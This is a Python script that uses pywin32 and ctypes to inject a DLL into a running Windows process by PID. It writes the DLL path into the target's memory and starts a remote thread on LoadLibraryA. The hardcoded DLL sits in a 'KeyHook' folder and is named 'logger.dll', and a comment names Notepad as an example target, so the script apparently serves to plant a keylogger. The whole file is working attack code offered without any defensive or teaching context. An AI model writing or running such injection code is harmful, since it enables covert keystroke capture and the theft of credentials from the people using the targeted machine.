import ctypes
import win32process
import win32con
import win32api
import win32event
import win32security

# Replace with real PID of target (e.g., Notepad)
# pid = 1234
# dll_path = "C:\\Path\\To\\Your\\log.dll"

pid = 2080
dll_path = "C:\\Users\\X\\Desktop\\KeyHook\\logger.dll"

# Access rights
PROCESS_ALL_ACCESS = (win32con.PROCESS_QUERY_INFORMATION |
                      win32con.PROCESS_CREATE_THREAD |
                      win32con.PROCESS_VM_OPERATION |
                      win32con.PROCESS_VM_WRITE |
                      win32con.PROCESS_VM_READ)

# Open target process
h_process = win32api.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

# Allocate memory in the target process for the DLL path
arg_address = ctypes.windll.kernel32.VirtualAllocEx(
    h_process.handle, 0, len(dll_path) + 1, win32con.MEM_COMMIT, win32con.PAGE_READWRITE
)

# Write DLL path to allocated memory
ctypes.windll.kernel32.WriteProcessMemory(
    h_process.handle, arg_address, dll_path.encode('utf-8'), len(dll_path) + 1, None
)

# Get address of LoadLibraryA
h_kernel32 = ctypes.windll.kernel32.GetModuleHandleW("kernel32.dll")
load_library_a = ctypes.windll.kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

# Create remote thread to load the DLL
thread_id = ctypes.c_ulong(0)
if ctypes.windll.kernel32.CreateRemoteThread(
    h_process.handle, None, 0, load_library_a, arg_address, 0, ctypes.byref(thread_id)
):
    print("DLL injected successfully!")
else:
    print("Injection failed.")

win32api.CloseHandle(h_process)
